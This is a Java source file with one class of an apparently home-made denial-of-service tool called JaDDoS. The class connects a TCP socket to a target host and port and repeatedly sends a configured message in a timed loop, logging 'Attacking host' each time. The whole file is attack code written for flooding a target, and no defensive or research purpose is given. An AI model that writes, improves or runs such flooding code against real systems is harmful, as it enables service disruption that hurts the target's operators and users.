/**
 * 
 */
package com.jaddos.protocol;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import org.apache.log4j.Logger;

import com.jaddos.core.JaDDoS;
import com.jaddos.core.JaDDoSPattern;

/**
 * @author SonoD
 *
 */
public class JaDDoSTCPProtocol extends JaDDoS implements IJaDDoSTCPProtocol {

	/**
	 * Instance of the current socket.
	 */
	private Socket socket;

	private Logger logger = Logger.getLogger(JaDDoSTCPProtocol.class);

	/**
	 * Create a JaDDoSTCPProtocol DDOS with a specified DDOS Pattern.
	 * 
	 * @param ddosPattern
	 */
	public JaDDoSTCPProtocol(JaDDoSPattern ddosPattern) {
		super(ddosPattern);
	}

	@Override
	public void run() {

		createSocket();
		connectToSocket();

		while (!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed())) {
			writeLineToSocket(getDdosPattern().getMessage());
			logger.info("Attacking host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());

			try {
				Thread.sleep(getDdosPattern().getTimeout());
			} catch (InterruptedException e) {
				logger.error("Unable to perform the attack: " + e.getMessage(), e);
			}
		}

		closeSocket();

	}

	@Override
	public void writeLineToSocket(String message) {
		try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(getSocket().getOutputStream()))) {
			bw.write(getDdosPattern().getMessage());
			bw.flush();
		} catch (IOException e) {
			logger.error("There has been error while writing to the buffer: " + e.getMessage(), e);
		}
	}

	@Override
	protected void createSocket() {
		setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
		socket = new Socket();

		try {
			socket.setKeepAlive(true);
			socket.setSoTimeout(getDdosPattern().getSocketTimeout());
		} catch (SocketException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}
	}

	@Override
	protected void connectToSocket() {
		try {
			if (socket != null) {
				socket.connect(getAddress());
			}
		} catch (UnknownHostException e) {
			logger.error("Host " + getAddress() + " doesn´t exist!", e);
		} catch (SocketException e) {
			logger.error("Error while creating or accessing a Socket. Socket Error: " + e.getMessage(), e);
			closeSocket();
		} catch (IOException e) {
			logger.error("Error while creating or accessing a Socket. IO Error: " + e.getMessage(), e);
		}

	}

	@Override
	protected void closeSocket() {
		try {
			if (socket != null && !socket.isClosed() && socket.isBound()) {
				socket.close();
			}
		} catch (IOException e) {
			logger.error("Can not close the socket: " + e.getMessage(), e);
		}
	}

	@Override
	public Socket getSocket() {
		return socket;
	}

	@Override
	public void setSocket(Socket socket) {
		this.socket = socket;

	}

}
